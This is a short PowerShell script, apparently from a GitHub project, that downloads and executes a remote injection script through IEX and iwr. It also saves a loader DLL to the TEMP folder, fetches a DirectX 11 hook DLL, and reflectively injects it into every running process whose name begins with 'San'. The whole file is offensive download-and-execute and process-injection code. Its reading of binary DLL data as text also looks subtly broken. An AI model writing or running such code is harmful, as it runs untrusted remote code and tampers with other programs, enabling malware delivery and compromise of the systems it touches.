#from zblwtf
IEX(iwr -Uri "https://raw.githubusercontent.com/zblwtf/Improved-remote-reflection-injection-scripts/main/Invoke-ReflectDllInjection.ps1");


$url_loader = 'https://raw.githubusercontent.com/zblwtf/Improved-remote-reflection-injection-scripts/main/ReflectPEInject_x64.dll';
$url_dll = 'https://raw.githubusercontent.com/zblwtf/Improved-remote-reflection-injection-scripts/main/DX11Hook.dll';

$request = [System.Net.HttpWebRequest]::Create($url_dll);
$response = $request.GetResponse();
$stream = $response.GetResponseStream();
$reader = New-Object System.IO.StreamReader($stream);
$dllBytes = $reader.ReadToEnd();

iwr -uri $url_loader -OutFile $env:TEMP\loader.dll
import-module -path $env:TEMP\loader.dll
#[Mr_Robot.oneshot]::RemoteReflectPEInjection(byte[] dllBytes,int processId)
%{get-process -name San*}|%{[Mr_Robot.oneshot]::RemoteReflectPEInjection($dllBytes,$_.Id)}







